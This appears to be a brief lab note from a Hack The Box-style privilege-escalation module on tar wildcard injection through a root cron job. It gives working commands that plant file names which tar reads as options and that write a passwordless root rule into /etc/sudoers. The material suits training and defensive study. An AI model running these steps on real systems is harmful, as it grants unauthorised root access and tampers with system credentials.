## Wildcard abuse

Consider this `crontab` job

```
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Notice the `*` at the end. When this job runs, every file name in the `/home-htb-student` is passed into the tar command as arguments.

So we can create those file:

```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
